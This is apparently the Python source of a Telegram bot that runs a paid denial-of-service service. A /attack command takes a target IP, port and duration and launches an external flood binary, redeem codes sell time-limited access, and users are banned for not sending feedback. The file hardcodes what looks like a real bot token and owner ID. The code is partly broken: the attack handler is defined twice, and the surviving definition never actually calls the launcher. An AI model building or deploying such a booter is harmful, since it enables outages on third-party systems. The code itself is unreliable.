import os
import asyncio
import random
import string
import json
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler

# Display startup message
print("Bot Starting...")

# Load the bot token securely
TELEGRAM_BOT_TOKEN = '7515339193:AAHq7M4Va5KiqsYEZtzRivaAxiii89iDywA'  # Replace with your bot token
OWNER_ID = '1866961136'  # Replace with your Telegram ID
DATA_FILE = 'data.json'

# Store data
user_access = {}
group_access = {}
redeem_codes = {}
admin_list = [OWNER_ID]
banned_users = {}
pending_feedback = {}

# Load data from JSON
def load_data():
    global user_access, group_access, redeem_codes, admin_list, banned_users
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            data = json.load(f)
            user_access = data.get('user_access', {})
            group_access = data.get('group_access', {})
            redeem_codes = data.get('redeem_codes', {})
            admin_list.extend(data.get('admin_list', []))
            banned_users = data.get('banned_users', {})

# Save data to JSON
def save_data():
    data = {
        'user_access': user_access,
        'group_access': group_access,
        'redeem_codes': redeem_codes,
        'admin_list': admin_list,
        'banned_users': banned_users
    }
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f)

async def start(update: Update, context: CallbackContext):
    await update.message.reply_text("🔥 Welcome! Use /help to see available commands.")

async def help_command(update: Update, context: CallbackContext):
    help_text = (
        "🔹 /attack <ip> <port> <duration> - Launch an attack\n"
        "🔹 /redeem <duration> - Generate a redeem code (Admin only)\n"
        "🔹 /redeem_code <code> - Redeem access to /attack\n"
        "🔹 /check_access - Check access in group/private\n"
        "🔹 /add_admin <user_id> - Add an admin (Owner only)\n"
        "🔹 /remove_admin <user_id> - Remove an admin (Owner only)\n"
        "🔹 /broadcast <message> - Send a message to all users (Admin only)\n"
    )
    await update.message.reply_text(help_text)

#Attack Run
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./Rohan  {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

#Redeem Code Command
async def generate_redeem_code(duration):
    code_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
    code = f"Rohan-{code_suffix}"
    expiry_time = datetime.now() + timedelta(days=duration)
    redeem_codes[code] = expiry_time.isoformat()
    save_data()
    return code

async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if len(context.args) != 1:
        await update.message.reply_text("Usage: /redeem_code <code>")
        return

    code = context.args[0]

    if code not in redeem_codes:
        await update.message.reply_text("Invalid or expired code!")
        return

    expiry_time = datetime.fromisoformat(redeem_codes.pop(code))

    if str(chat_id).startswith('-'):
        chat_member = await context.bot.get_chat_member(chat_id, user_id)
        if chat_member.status not in ['administrator', 'creator']:
            await update.message.reply_text("Only admins can redeem codes in groups!")
            return
        group_access[str(chat_id)] = expiry_time.isoformat()
        await update.message.reply_text(f"✅ Group access granted until {expiry_time}!")
    else:
        user_access[user_id] = expiry_time.isoformat()
        await update.message.reply_text(f"✅ You have access until {expiry_time}!")

    save_data()

async def check_access(update: Update, context: CallbackContext):
    chat_id = str(update.effective_chat.id)
    if chat_id.startswith('-'):
        expiry = group_access.get(chat_id, "No access")
        await update.message.reply_text(f"Group access: {expiry}")
    else:
        expiry = user_access.get(chat_id, "No access")
        await update.message.reply_text(f"Your access: {expiry}")

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if chat_id.startswith('-'):
        access_expiry = group_access.get(str(chat_id))
    else:
        access_expiry = user_access.get(user_id)

    if not access_expiry or datetime.now() > datetime.fromisoformat(access_expiry):
        await update.message.reply_text("❌ No access! Redeem a code with /redeem_code <code>")
        return

    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <duration>")
        return

    ip, port, duration = context.args
    await update.message.reply_text(f"🔥 Attack started on {ip}:{port} for {duration} seconds!")

    pending_feedback[user_id] = chat_id
    await asyncio.sleep(120)
    if user_id in pending_feedback:
        banned_users[user_id] = True
        save_data()
        await update.message.reply_text("⚠️ You have been temporarily banned for not providing feedback.")

async def handle_feedback(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    if user_id in pending_feedback:
        del pending_feedback[user_id]
        await update.message.reply_text("✅ Thank you for your feedback!")
    else:
        await update.message.reply_text("❌ No pending feedback request.")

async def broadcast(update: Update, context: CallbackContext):
    if str(update.effective_user.id) not in admin_list:
        await update.message.reply_text("❌ You don't have permission to use this command.")
        return

    message = ' '.join(context.args)
    for user in user_access.keys():
        try:
            await context.bot.send_message(chat_id=user, text=message)
        except:
            pass
    for group in group_access.keys():
        try:
            await context.bot.send_message(chat_id=group, text=message)
        except:
            pass
    await update.message.reply_text("✅ Broadcast sent!")

def main():
    load_data()
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("redeem_code", redeem_code))
    app.add_handler(CommandHandler("check_access", check_access))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(MessageHandler(filters.PHOTO, handle_feedback))

    app.run_polling()

if __name__ == '__main__':
    main()
